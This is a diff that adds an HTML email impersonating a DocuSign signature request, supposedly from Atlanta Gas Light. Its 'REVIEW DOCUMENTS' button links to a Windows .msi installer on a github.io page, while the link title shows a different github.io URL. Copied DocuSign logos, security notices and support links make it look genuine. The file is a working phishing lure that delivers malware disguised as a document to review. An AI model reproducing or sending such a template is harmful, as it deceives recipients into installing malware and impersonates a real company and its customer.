@@ -1,0 +1,187 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><META http-equiv="Content-Type" content="text/html; charset=utf-8">
+<STYLE>
+body,p,div,td { font-family: Arial; }</STYLE>
+</HEAD>
+<BODY bgColor=#ffffff>
+<DIV
+style="BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; PADDING-BOTTOM: 19px; PADDING-TOP: 19px; PADDING-LEFT: 19px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 19px; BACKGROUND-COLOR: rgb(234,234,234)"
+align=center data-ogsb="rgb(234, 234, 234)">
+<DIV class=R1UVb
+style="OVERFLOW: hidden; BORDER-TOP: 0px; BORDER-RIGHT: 0px; WIDTH: 942px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; POSITION: relative; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
+<DIV align=center>
+<TABLE role=presentation style="WIDTH: 942px" cellSpacing=0 cellPadding=0
+align=center border=0>
+  <TBODY>
+  <TR>
+    <TD style="WIDTH: 640px; WHITE-SPACE: normal !important">
+      <TABLE role=presentation
+      style="BOX-SIZING: border-box; MAX-WIDTH: 640px; BORDER-COLLAPSE: collapse; BORDER-SPACING: 0px; BACKGROUND-COLOR: rgb(255,255,255)"
+      data-ogsb="rgb(255, 255, 255)">
+        <TBODY>
+        <TR>
+          <TD
+          style="WHITE-SPACE: normal !important; PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 24px; PADDING-RIGHT: 24px"><SPAN
+            style="FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: Helvetica, Arial, 'Sans Serif', serif, EmojiFont; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(0,0,0) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; font-kerning: inherit; font-feature-settings: inherit; font-size-adjust: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; font-language-override: inherit"
+            data-ogsc="rgb(0, 0, 0)"><IMG class=bCDJk
+            style="BORDER-TOP: 0px; BORDER-RIGHT: 0px; WIDTH: 116px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"
+            alt=DocuSign
+            src="https://www.docusign.net/Signing/Images/email/Email_Logo.png"
+            width=116 data-olk-copy-source="MessageBody"
+            data-imagetype="External"></SPAN></TD></TR>
+        <TR>
+          <TD
+          style="WHITE-SPACE: normal !important; PADDING-BOTTOM: 30px; PADDING-LEFT: 24px; PADDING-RIGHT: 24px">
+            <TABLE role=presentation id=x_table_0
+            style="WIDTH: 592px; COLOR: rgb(255,255,255) !important; BACKGROUND-COLOR: rgb(30,76,161)"
+            cellSpacing=0 cellPadding=0 align=center border=0
+            data-ogsb="rgb(30, 76, 161)">
+              <TBODY>
+              <TR>
+                <TD
+                style="WIDTH: 520px; WHITE-SPACE: normal !important; COLOR: rgb(255,255,255) !important; PADDING-BOTTOM: 36px; TEXT-ALIGN: center; PADDING-TOP: 28px; PADDING-LEFT: 36px; PADDING-RIGHT: 36px; BACKGROUND-COLOR: rgb(30,76,161); border-radius: 2px"
+                data-ogsb="rgb(30, 76, 161)"><SPAN
+                  style="FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: Helvetica, Arial, 'Sans Serif', serif, EmojiFont; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; font-kerning: inherit; font-feature-settings: inherit; font-size-adjust: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; font-language-override: inherit"><IMG
+                  style="BORDER-TOP: 0px; HEIGHT: 75px; BORDER-RIGHT: 0px; WIDTH: 75px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"
+                  src="https://www.docusign.net/member/Images/email/docInvite-white.png"
+                  width=75 height=75 data-imagetype="External"></SPAN><SPAN
+                  style="FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: Arial, serif, EmojiFont; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; font-kerning: inherit; font-feature-settings: inherit; font-size-adjust: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; font-language-override: inherit">&nbsp;</SPAN>
+
+                  <TABLE role=presentation
+                  style="WIDTH: 520px; TEXT-ALIGN: center" cellSpacing=0
+                  cellPadding=0 border=0>
+                    <TBODY>
+                    <TR>
+                      <TD
+                      style="WHITE-SPACE: normal !important; COLOR: rgb(255,255,255) !important; TEXT-ALIGN: center; PADDING-TOP: 24px">
+                        <DIV class=x_skipProofing
+                        style="FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: Helvetica, Arial, 'Sans Serif', serif, EmojiFont; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; font-kerning: inherit; font-feature-settings: inherit; font-size-adjust: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; font-language-override: inherit">&nbsp;</DIV></TD></TR></TBODY></TABLE>
+                  <DIV
+                  style="FONT-SIZE: 15px; BORDER-TOP: 0px; FONT-FAMILY: Helvetica, Arial, 'Sans Serif', serif, EmojiFont; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(51,51,51) !important; PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; font-kerning: inherit; font-feature-settings: inherit; font-size-adjust: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; font-language-override: inherit"
+                  data-ogsc="rgb(51, 51, 51)"><SPAN
+                  style="BORDER-TOP: 0px; FONT-FAMILY: inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 44px; PADDING-RIGHT: 0px; font-stretch: inherit; font-kerning: inherit; font-feature-settings: inherit; font-size-adjust: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; font-language-override: inherit"><A
+                  id=OWAa5f331fd-bff0-851a-c800-a6e92cda4bd9
+                  title=https://dsc342.github.io/doc/hhwe8.html
+                  class=x_OWAAutoLink
+                  style="TEXT-DECORATION: underline; BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: blue; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"
+                  href="https://carolyndarwin.github.io/gvhjknlmdjn/10010PEGJWQ9S_19SYPURD17668_windows_x64.msi"
+                  rel="noopener noreferrer" target=_blank
+                  data-auth="NotApplicable" data-linkindex=0><B><FONT
+                  color=#ffffff>REVIEW
+                DOCUMENTS</FONT></B></A></SPAN><BR></DIV></TD></TR></TBODY></TABLE></TD></TR>
+        <TR>
+          <TD
+          style="WHITE-SPACE: normal !important; COLOR: rgb(0,0,0) !important; PADDING-BOTTOM: 24px; PADDING-LEFT: 24px; PADDING-RIGHT: 24px; BACKGROUND-COLOR: white"
+          data-ogsb="white" data-ogsc="rgb(0, 0, 0)">
+            <DIV aria-hidden=true class=x_skipProofing
+            style="FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: Arial, serif, EmojiFont; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; font-kerning: inherit; font-feature-settings: inherit; font-size-adjust: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; font-language-override: inherit">&nbsp;</DIV></TD></TR>
+        <TR>
+          <TD
+          style="WHITE-SPACE: normal !important; COLOR: rgb(102,102,102) !important; PADDING-BOTTOM: 12px; PADDING-LEFT: 24px; PADDING-RIGHT: 24px; BACKGROUND-COLOR: rgb(255,255,255)"
+          data-ogsb="rgb(255, 255, 255)" data-ogsc="rgb(102, 102, 102)">
+            <DIV aria-hidden=true class=x_skipProofing
+            style="FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: Arial, serif, EmojiFont; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; font-kerning: inherit; font-feature-settings: inherit; font-size-adjust: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; font-language-override: inherit">&nbsp;</DIV></TD></TR>
+        <TR>
+          <TD
+          style="WHITE-SPACE: normal !important; PADDING-BOTTOM: 45px; PADDING-TOP: 30px; PADDING-LEFT: 24px; PADDING-RIGHT: 24px; BACKGROUND-COLOR: rgb(234,234,234)"
+          data-ogsb="rgb(234, 234, 234)">
+            <DIV class=x_skipProofing
+            style="FONT-SIZE: 13px; BORDER-TOP: 0px; FONT-FAMILY: Helvetica, Arial, 'Sans Serif', serif, EmojiFont; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(102,102,102) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px; font-stretch: inherit; font-kerning: inherit; font-feature-settings: inherit; font-size-adjust: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; font-language-override: inherit"
+            data-ogsc="rgb(102, 102, 102)"><B>Do Not Share This
+            Email</B><BR>This email contains a secure link to DocuSign. Please
+            do not share this email, link, or access code with others.</DIV>
+            <DIV class=x_skipProofing
+            style="FONT-SIZE: 13px; BORDER-TOP: 0px; FONT-FAMILY: Helvetica, Arial, 'Sans Serif', serif, EmojiFont; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(102,102,102) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px; font-stretch: inherit; font-kerning: inherit; font-feature-settings: inherit; font-size-adjust: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; font-language-override: inherit"
+            data-ogsc="rgb(102, 102, 102)">&nbsp;</DIV>
+            <DIV class=x_skipProofing
+            style="FONT-SIZE: 13px; BORDER-TOP: 0px; FONT-FAMILY: Helvetica, Arial, 'Sans Serif', serif, EmojiFont; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(102,102,102) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px; font-stretch: inherit; font-kerning: inherit; font-feature-settings: inherit; font-size-adjust: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; font-language-override: inherit"
+            data-ogsc="rgb(102, 102, 102)"><B>About DocuSign</B><BR>Sign
+            documents electronically in just minutes. It's safe, secure, and
+            legally binding. Whether you're in an office, at home, on-the-go --
+            or even across the globe -- DocuSign provides a professional trusted
+            solution for Digital Transaction Management™.</DIV>
+            <DIV class=x_skipProofing
+            style="FONT-SIZE: 13px; BORDER-TOP: 0px; FONT-FAMILY: Helvetica, Arial, 'Sans Serif', serif, EmojiFont; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(102,102,102) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px; font-stretch: inherit; font-kerning: inherit; font-feature-settings: inherit; font-size-adjust: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; font-language-override: inherit"
+            data-ogsc="rgb(102, 102, 102)"><B>Questions about the
+            Document?</B><BR>If you need to modify the document or have
+            questions about the details in the document, please reach out to the
+            sender by emailing them directly.<BR><BR><B>Stop receiving this
+            email</B><BR><SPAN
+            style="BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(36,99,209) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"
+            data-ogsc="rgb(36, 99, 209)"><A
+            id=OWA896b00d9-69f9-359d-c889-504f82f8c2e7
+            title=https://protect.docusign.net/report-abuse?e=AUtomjpFak9GlbPL0zFFi12E7L6gGOx8nYy27k5Jm0EfTVD9UVniVzigiX-71LMZLy8k6YqqwszNnaGWMax6EX4iltZnslR65lLFln3Spwd2_P8Z24Ffsb2iU6VgL1TOvI5oo15NWhe4uYTJ6JwqL155sG67Z74P6JpqDa1J09gM9OHUeDjQgTAiFFh-cVo306O9DSp31M9dGzI9I4Sg-UDXFS6Y6a-h5pJpP-au2-bgdt5a97HhYd1GoS7XIHBjKNzu6be5CkrNh_NgW4sNZttb8T0akwdzCkyE61l30JQHxCJKxX8obxhh9_DASMvTR3F7rHbV2f-fxjHsE0h-_133Cjv8BBt9pKX--zPG51_E0wumBUelNGWv0qKVdJwBsYuMZEooATgr8EAEE4p5hGY3KWQlOAeb4tnm3eVar-4TgRB5IC6BPMBCboiu0CdvLQ&lang=en
+            class=x_OWAAutoLink
+            style="TEXT-DECORATION: underline; BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(36,99,209) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"
+            href="https://protect.docusign.net/report-abuse?e=AUtomjpFak9GlbPL0zFFi12E7L6gGOx8nYy27k5Jm0EfTVD9UVniVzigiX-71LMZLy8k6YqqwszNnaGWMax6EX4iltZnslR65lLFln3Spwd2_P8Z24Ffsb2iU6VgL1TOvI5oo15NWhe4uYTJ6JwqL155sG67Z74P6JpqDa1J09gM9OHUeDjQgTAiFFh-cVo306O9DSp31M9dGzI9I4Sg-UDXFS6Y6a-h5pJpP-au2-bgdt5a97HhYd1GoS7XIHBjKNzu6be5CkrNh_NgW4sNZttb8T0akwdzCkyE61l30JQHxCJKxX8obxhh9_DASMvTR3F7rHbV2f-fxjHsE0h-_133Cjv8BBt9pKX--zPG51_E0wumBUelNGWv0qKVdJwBsYuMZEooATgr8EAEE4p5hGY3KWQlOAeb4tnm3eVar-4TgRB5IC6BPMBCboiu0CdvLQ&lang=en"
+            rel="noopener noreferrer" target=_blank data-auth="NotApplicable"
+            data-ogsc="rgb(36, 99, 209)" data-linkindex=1>Report this
+            email</A></SPAN>&nbsp;or read more about<SPAN>&nbsp;</SPAN><SPAN
+            style="BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(36,99,209) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"
+            data-ogsc="rgb(36, 99, 209)"><A
+            id=OWA0c48099b-d438-6abf-2940-60e35e0d7622
+            title=https://support.docusign.com/en/guides/Declining-to-sign-DocuSign-Signer-Guide
+            class=x_OWAAutoLink
+            style="TEXT-DECORATION: underline; BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(36,99,209) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"
+            href="https://support.docusign.com/en/guides/Declining-to-sign-DocuSign-Signer-Guide"
+            rel="noopener noreferrer" target=_blank data-auth="NotApplicable"
+            data-ogsc="rgb(36, 99, 209)" data-linkindex=2>Declining to
+            sign</A></SPAN>&nbsp;and<SPAN>&nbsp;</SPAN><SPAN
+            style="BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(36,99,209) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"
+            data-ogsc="rgb(36, 99, 209)"><A
+            id=OWA3f88c352-6cae-953d-7325-d20e87aecdeb
+            title=https://support.docusign.com/en/articles/How-do-I-manage-my-email-notifications
+            class=x_OWAAutoLink
+            style="TEXT-DECORATION: underline; BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(36,99,209) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"
+            href="https://support.docusign.com/en/articles/How-do-I-manage-my-email-notifications"
+            rel="noopener noreferrer" target=_blank data-auth="NotApplicable"
+            data-ogsc="rgb(36, 99, 209)" data-linkindex=3>Managing
+            notifications</A></SPAN>.<BR><BR>If you are having trouble signing
+            the document, please visit the<SPAN>&nbsp;</SPAN><SPAN
+            style="BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(36,99,209) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"
+            data-ogsc="rgb(36, 99, 209)"><A
+            id=OWAdd087a8a-3692-372d-f0f3-096aea1015da
+            title=https://support.docusign.com/s/articles/How-do-I-sign-a-DocuSign-document-Basic-Signing?language=en_US&utm_campaign=GBL_XX_DBU_UPS_2211_SignNotificationEmailFooter&utm_medium=product&utm_source=postsend
+            class=x_OWAAutoLink
+            style="TEXT-DECORATION: underline; BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(36,99,209) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"
+            href="https://support.docusign.com/s/articles/How-do-I-sign-a-DocuSign-document-Basic-Signing?language=en_US&utm_campaign=GBL_XX_DBU_UPS_2211_SignNotificationEmailFooter&utm_medium=product&utm_source=postsend"
+            rel="noopener noreferrer" target=_blank data-auth="NotApplicable"
+            data-ogsc="rgb(36, 99, 209)" data-linkindex=4>Help with
+            Signing</A></SPAN>&nbsp;page on our<SPAN>&nbsp;</SPAN><SPAN
+            style="BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(36,99,209) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"
+            data-ogsc="rgb(36, 99, 209)"><A
+            id=OWA9652c785-c31c-2056-8ec4-1c31b9c8d0d8
+            title=https://www.docusign.com/support class=x_OWAAutoLink
+            style="TEXT-DECORATION: underline; BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(36,99,209) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"
+            href="https://www.docusign.com/support" rel="noopener noreferrer"
+            target=_blank data-auth="NotApplicable" data-ogsc="rgb(36, 99, 209)"
+            data-linkindex=5>Support Center</A></SPAN>.<BR><BR></DIV>
+            <DIV class=x_skipProofing
+            style="FONT-SIZE: 13px; BORDER-TOP: 0px; FONT-FAMILY: Helvetica, Arial, 'Sans Serif', serif, EmojiFont; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(36,99,209) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 0px; font-stretch: inherit; font-kerning: inherit; font-feature-settings: inherit; font-size-adjust: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; font-language-override: inherit"
+            data-ogsc="rgb(36, 99, 209)"><A
+            id=OWAf95177df-53ce-3459-f3d6-24f7b893c114
+            title=https://www.docusign.com/features-and-benefits/mobile?utm_campaign=GBL_XX_DBU_UPS_2211_SignNotificationEmailFooter&utm_medium=product&utm_source=postsend
+            class=x_OWAAutoLink
+            style="TEXT-DECORATION: underline; BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(36,99,209) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px"
+            href="https://www.docusign.com/features-and-benefits/mobile?utm_campaign=GBL_XX_DBU_UPS_2211_SignNotificationEmailFooter&utm_medium=product&utm_source=postsend"
+            rel="noopener noreferrer" target=_blank data-auth="NotApplicable"
+            data-ogsc="rgb(36, 99, 209)" data-linkindex=6><IMG class=bCDJk
+            style="BORDER-TOP: 0px; HEIGHT: 18px; BORDER-RIGHT: 0px; WIDTH: 18px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px 7px 0px 0px; PADDING-RIGHT: 0px"
+            src="https://www.docusign.net/Member/Images/email/icon-DownloadApp-18x18@2x.png"
+            width=18 height=18 data-imagetype="External">Download the DocuSign
+            App</A></DIV>
+            <DIV class=x_skipProofing
+            style="FONT-SIZE: 10px; BORDER-TOP: 0px; FONT-FAMILY: Helvetica, Arial, 'Sans Serif', serif, EmojiFont; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(102,102,102) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 14px; PADDING-RIGHT: 0px; font-stretch: inherit; font-kerning: inherit; font-feature-settings: inherit; font-size-adjust: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; font-language-override: inherit"
+            data-ogsc="rgb(102, 102, 102)">This message was sent to you by
+            Atlanta Gas Light who is using the DocuSign Electronic Signature
+            Service. If you would rather not receive email from this sender you
+            may contact the sender with your
+    request.</DIV></TD></TR></TBODY></TABLE></TD>
+    <TD style="WHITE-SPACE: normal !important">
+      <DIV aria-hidden=true class=x_skipProofing
+      style="FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: Arial, serif, EmojiFont; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(0,0,0) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; font-kerning: inherit; font-feature-settings: inherit; font-size-adjust: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; font-language-override: inherit"
+      data-ogsc="rgb(0, 0, 0)">&nbsp;</DIV></TD></TR></TBODY></TABLE></DIV></DIV></DIV>
+<DIV class=x_elementToProof
+style="FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: Aptos, Aptos_EmbeddedFont, Aptos_MSFontService, Calibri, Helvetica, sans-serif, serif, EmojiFont; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(0,0,0) !important; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; font-kerning: inherit; font-feature-settings: inherit; font-size-adjust: inherit; font-optical-sizing: inherit; font-variation-settings: inherit; font-language-override: inherit"
+align=center data-ogsc="rgb(0, 0, 0)"><BR
+style="FONT-SIZE: 16px; FONT-FAMILY: Aptos, Aptos_EmbeddedFont, Aptos_MSFontService, Calibri, Helvetica, sans-serif, serif, EmojiFont; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial"></DIV></BODY></HTML>
